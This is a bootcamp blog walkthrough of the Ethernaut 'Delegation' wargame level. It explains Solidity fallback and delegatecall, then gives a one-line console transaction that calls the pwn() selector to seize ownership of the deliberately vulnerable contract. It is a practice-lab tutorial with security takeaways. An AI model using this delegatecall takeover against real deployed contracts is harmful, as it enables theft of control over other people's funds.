



Ethernaut Level 6 Walkthrough: Delegation - Metana



















































































 












Skip links* [Skip to primary navigation](#primary-nav)
* [Skip to content](#lqd-site-content)



 





 


 




Call us +1 415 416 0800 


















 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 








* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Bootcamps](#) 








###### Web3

 






### Web3 Solidity Bootcamp



Most Popular 🔥
The most advanced Solidity curriculum on the internet











### Full Stack Web3 Beginner Bootcamp



New ✨ | Beginner 👨‍💻
Starting off with web development and seamlessly integrating web3 development











### Web3 Rust Bootcamp



Become an expert Solana blockchain developer with one course!














###### Coding + Career Growth

 




 








### Software Engineering Bootcamp



Become a Software Engineer - Balance everyday life commitments & launch your coding career in as little as 16 weeks











### Metana's JobCamp™️



Learn to make a lasting first impressions, network effectively & search for jobs with confidence.















 ![](https://metana.io/wp-content/uploads/2023/10/Screenshot-2023-10-25-at-7.51.33 PM-300x61.png) 




 Rated
the Best

 





 Ranked as the industry's premier Web3 bootcamp with a stellar 4.8/5 star rating on Course Report.

 




[Read more reviews here](/reviews/)












[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)
* [Resources](#)
	+ [Reviews](https://metana.io/reviews/)
	+ [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
	+ [Tuition](https://metana.io/tuition/)
	+ [Events](https://metana.io/events/)
* [Blog](https://metana.io/blog/)

 





[Apply now](https://metana.typeform.com/general)






















 







 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 









Metana Bootcamps
----------------

 






* [Solidity BootcampHot 🔥](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [Full Stack Web3 Bootcamp](https://metana.io/web3-beginner-bootcamp/)
* [Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [Cybersecurity Bootcamp](https://metana.io/cybersecurity-bootcamp/)
* [AI & Machine Learning Bootcamp](https://metana.io/ai-machine-learning-bootcamp/)
* [Data Analytics Bootcamp](https://metana.io/data-analytics-bootcamp/)
* [Data Science Bootcamp](https://metana.io/data-science-bootcamp/)
* [Full Stack Bootcamp](https://metana.io/full-stack-software-engineer-bootcamp/)
* [Jobcamp](https://metana.io/jobcamp/)

 














Menu Items
----------

 






* [Blog](https://metana.io/blog/)
* [Metana’s Job Guarantee](https://metana.io/job-guarantee/)
* [Refer a Friend](https://metana.io/refer/)
* [Tuition](https://metana.io/tuition/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)

 









 








 [[email protected]](/cdn-cgi/l/email-protection)

 




 

[Facebook](https://www.facebook.com/metanahq) 


[Twitter](https://twitter.com/metanahq) 


[Linkedin](https://www.linkedin.com/school/metana/) 


























 [![Metana](https://metana.io/wp-content/uploads/2022/07/Metana-Logo.png)](https://metana.io/) 




[Apply now](https://metana.typeform.com/general)
























 
#### Table of Contents





 







Ethernaut Level 6 Walkthrough: Delegation
=========================================

 



 * [Vinh Tran](https://metana.io/blog/author/vinh-tran/)
* [May 3, 2024](https://metana.io/blog/2024/05/03/)
* [Ethernaut Walkthrough](https://metana.io/blog/category/ethernaut-walkthrough/)














In this level, we will familiarize ourselves with `delegatecall` and `fallback`. This serves as a preliminary step towards understanding more advanced concepts, like the proxy pattern.This article will clarify `delegatecall` and `fallback`, demonstrating how to use this knowledge to overcome this challenge.


Goal of Ethernaut Level 6
-------------------------


Claim `ownership` of `Delegation` contract



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}

```

Understanding `fallback` and `delegatecall`
-------------------------------------------


### fallback()


`fallback` is a special function that is executed either when


* calling **non-existent functions**
* sending ether directly to a contract but `receive()` does not exist or `msg.data` is **not** **empty**


In this challenge, we are focusing on the first reason.


**Example**



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract FallbackContract {
		event Called(bytes data);
		
    fallback() external {
        emit Called(msg.data);
    }
}

```

* Lets call `helloWorld()` of the above contract, as `helloWorld()` does not exist, `fallback` will be executed.
* If we check emitted event, you will see



```
[
  {
    "from": "0xd2a5bC10698FD955D1Fe6cb468a17809A08fd005",
    "topic": "0x43728e47c6f378312077a49106659446a23766fc65b3674c995b89121d8efeea",
    "event": "Called",
    "args": {
      "0": "0xc605f76c",
      "data": "0xc605f76c"
    }
  }
]

```

### About `msg.data`


`msg.data` is a special variable in Solidity that contains the data that is sent when calling a function on a smart contract.


When invoking a function, `msg.data` consists of the function selector and arguments.


* The **function selector** is the first four bytes of the \*\*\*\*`msg.data`.
* To calculate the function selector:
	1. Compute the keccak256 hash of the function signature (e.g., `keccak256("helloWorld()")`).
	2. Take the first 4 bytes of the hash.
	3. This resulting value is the function selector.


### delegatecall()


* `delegatecall` is a low level function similar to `call`.
* When contract `A` executes `delegatecall` to contract `B`, `B`‘s code is executed with contract `A`‘s storage, `msg.sender` and `msg.value`.


**Example**



```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract A {
		uint256 public number;
		
    function delegateB(address contractB) external {
		    (bool success, bytes memory data) = contractB.delegatecall(
		        abi.encodeWithSignature("increase()")
        );
    }
}

contract B {
		uint256 public number;
		
    function increase() external {
        number+=1;
    }
}

```

* When we execute `delegateB`, it results in the `number` of contract **A** being incremented, instead of the `number` of contract **B**.


Hacking
-------


1. We execute a call to `pwn()` within the **Delegation** contract.
2. As `pwn()` is not a defined function in **Delegation**, the contract invokes its `fallback` function.
3. The `fallback` function then invokes `delegatecall` to execute `pwn()` within the context of the `Delegate` contract, utilizing the storage of `Delegation`.



```
// Open your browser's console
sendTransaction({
		from: "<Player address>",
		to: "<Delegation contract address>",
		data:"0xdd365b8b" // pwn() selector
})

```

Congratulations! You completed the **Ethernaut level 6 – Delegation challenge** 🥳


Security Takeaways
------------------


* Ensure you fully understand the calling contract when using `delegatecall`.
* Please be careful about storage orders when using `delegatecall`. Ensure it correctly changes the state.


Ready for the next Ethernaut challenge? Click to check out the [previous ethernaut challenge](https://metana.io/blog/ethernaut-level-5-walkthrough-token/) and see what’s next in our series!



![faq](https://metana.io/wp-content/uploads/2024/01/Questions-cuate-1024x1024.png)
FAQs
----


**What is the Ethernaut Level 6: Delegation challenge about?**


* The challenge involves interacting with a delegate call in Ethereum smart contracts to exploit vulnerabilities and take ownership of the contract.


**How do you solve the Delegation level in Ethernaut?**


* The solution requires understanding delegate calls and how they can be manipulated to change contract states, including using the fallback function.


**What skills are necessary to complete Ethernaut Level 6?**


* Knowledge of Solidity, smart contract security, the Ethereum Virtual Machine (EVM), and JavaScript for interacting with the blockchain.


**Can completing Ethernaut Level 6 help improve my blockchain security skills?**


* Yes, it offers practical experience in identifying and exploiting smart contract vulnerabilities, crucial for blockchain security professionals.


**What are delegate calls in Ethereum smart contracts?**


* Delegate calls are a feature that allows one contract to call another’s function and run it with the original contract’s storage context.


**Where can I learn more about blockchain security?**


* Consider [online courses](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/), webinars, workshops, and industry conferences focused on cryptocurrency, blockchain technology, and cybersecurity.


**What is Ethernaut and who should try it?**


* Ethernaut is an open-source wargame for those interested in Ethereum and smart contract security, ideal for developers and security enthusiasts.


**How can one practice Ethereum smart contract coding?**


* Engage in coding challenges like Ethernaut, contribute to open-source projects, and build personal projects on Ethereum networks.


**What are common vulnerabilities in Ethereum smart contracts?**


* Common issues include reentrancy attacks, mishandling of delegate calls, and failures in access control.


**Why is understanding smart contracts important for blockchain technology?**


* Smart contracts are integral to decentralized applications on blockchain platforms; understanding them is crucial for building secure, efficient systems.






![](https://metana.io/wp-content/uploads/2024/05/Ethernaut-Level-6-Walkthrough-Delegation-.jpg) 





[PrevPreviousEthernaut Level 5 Walkthrough: Token](https://metana.io/blog/ethernaut-level-5-walkthrough-token/) 




[NextSolidity and zk-SNARKs: The Dynamic Power DuoNext](https://metana.io/blog/solidity-and-zk-snarks-the-dynamic-power-duo/) 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy ✨

 




 You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






Web3 Solidity Bootcamp
======================

 





 The most advanced Solidity curriculum on the internet!

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-beginner-bootcamp/)













You may also like
-----------------

 






![](https://metana.io/wp-content/uploads/2024/07/Protect-Yourself-from-Rug-Pulls-Tips-to-Avoid-Crypto-Scams-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




11 mins ago

#### [Protect Yourself from Rug Pulls: Tips to Avoid Crypto Scams](https://metana.io/blog/protect-yourself-from-rug-pulls-tips-to-avoid-crypto-scams/)




The world of Web3 is brimming with promises of high returns and revolutionary projects, driving 


![](https://metana.io/wp-content/uploads/2024/07/ERC-Token-Standards-Your-Simplified-Guide-copy-640x364.jpg)







### [Metana Editorial](https://metana.io/blog/author/editorial/)




1 day ago

#### [Address Poisoning in Smart Contracts](https://metana.io/blog/address-poisoning-in-smart-contracts/)




Web3 thrives on user empowerment and the ease of sending and receiving cryptocurrency. However, a 
 







#### Metana Guarantees  a Job 💼

 





#### Plus Risk Free 2-Week Refund Policy

 




You’re guaranteed a new job in web3—or you’ll get a full tuition refund. We also offer a hassle-free two-week refund policy. If you’re not satisfied with your purchase for any reason, you can request a refund, no questions asked.

 






#### Web3 Solidity Bootcamp

 





 The most advanced Solidity curriculum on the internet

 




* 4 Months
* Prior coding experience required
* 20h/ Week
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services






[View Program](/web3-solidity-bootcamp-ethereum-blockchain/)







Full Stack Web3 Beginner Bootcamp
=================================

 





 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




* 7 Months
* Beginner - Zero to Hero
* 25h/ Week
* Your very own personal support tutor
* 1-on-1 mentorship
* Expert code reviews
* Coaching & career services







 Learn foundational principles while gaining hands-on experience with Ethereum, DeFi, and Solidity.

 




[View Program](/web3-beginner-bootcamp/)







Events by Metana
================

 





 Dive into the exciting world of Web3 with us as we explore cutting-edge technical topics, provide valuable insights into the job market landscape, and offer guidance on securing lucrative positions in Web3. 

 




 





 







Do you have anything you want us to cover in our blog posts? What should we talk about next? We need your suggestions! 
 





Submit
















Start Your  Application
-----------------------

 






Secure your spot now. Spots are limited, and we accept qualified applicants on a first come, first served basis..




 






Email(Required)

Career Track(Required)


Web3



Data



Full Stack



Cyber

  








Δ










The application is free and takes just 3 minutes to complete.

 















##### What is included in the course?

 






### Expert-curated curriculum










### Weekly 1:1 video calls with your mentor










### Weekly group mentoring calls










### On-demand mentor support










### Portfolio reviews by Design hiring managers










### Resume & LinkedIn profile reviews










### Active online student community










### 1:1 and group career coaching calls










### Access to our employer network










### Job Guarantee




















 






###### Address

 





 44 Montgomery St,   

San Francisco, CA 94104, United States

 












Email 







Subscribe












###### Contact us

 





###### Call us directly

 





 (415) 416-0800

 





###### Mail us directly

 





 [[email protected]](/cdn-cgi/l/email-protection)

 









### Company

 




* [Home](/)
* [Blog](https://metana.io/blog/)
* [Jobs at Metana](/jobs/)
* [Bootcamp Application](https://metana.io/apply/)
* [Refer a friend](/refer/)
* [Student Perks](/perks/)
* [Testimonials](/reviews)
* [LMS login](https://app.metana.io/)
* [Open LMS login (Full Stack)](https://open.metana.io/)









### Bootcamp

 




* [Web3 Bootcamps](https://metana.io/web3-0-bootcamp/)
* [- Solidity Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Web3 Beginner Bootcamp](https://metana.io/web3-solidity-bootcamp-ethereum-blockchain/)
* [- Rust Bootcamp](https://metana.io/web3-rust-bootcamp-solana-blockchain/)
* [- ZK Bootcamp](/web3-zero-knowledge-bootcamp/)
* [Data + AI bootcamps](#)
* [- Data Analytics Bootcamp](/data-analytics-bootcamp/)
* [- Data Science Bootcamp](/data-science-bootcamp/)
* [- AI/ML Bootcamp](/ai-machine-learning-bootcamp/)
* [Software Engineering Bootcamp](/full-stack-software-engineer-bootcamp/)
* [Cybersecurity Bootcamp](/cybersecurity-bootcamp/)
* [Jobcamp](/jobcamp/)
* [Tuition](https://metana.io/tuition/)









### For businesses

 




* [Business](https://metana.io/business/)
* [- Hiring Partner](https://metana.io/business/hiring-partner/)
* [- Upskill Your Team](/business/upskill-your-team/)









### Legal

 




* [Licences](https://metana.io/licences/)
* [Metana's Job Guarantee](https://metana.io/job-guarantee/)
* [Withdrawal and Refund Policy](https://metana.io/withdrawal-and-refund-policy/)
* [Privacy Policy](/privacy-policy/)













[Still Unsure?](https://formless.ai/c/6bPi6ASGJ4ge)








[![](https://metana.io/wp-content/uploads/2022/07/Metana-Logo-Black-Full.png)](https://metana.io) 







 Disclaimer:
‍
Metana is involved in the Blockchain Education activities only. We are not dealing with any Crypto related stuff nor provide advice in the Crypto related field.

 

















 Metana is a pioneer in education and career transformation, specializing in today’s most in-demand skills. The leading source for training, staffing, and career transitions, we foster a flourishing community of professionals pursuing careers they love.
| © 2023 Edmore (private) limited

 








[Facebook](https://www.facebook.com/metanahq) 





[Linkedin](https://www.linkedin.com/school/metana/) 














































































Adding {{itemName}} to cart


Added {{itemName}} to cart













Loading...



×






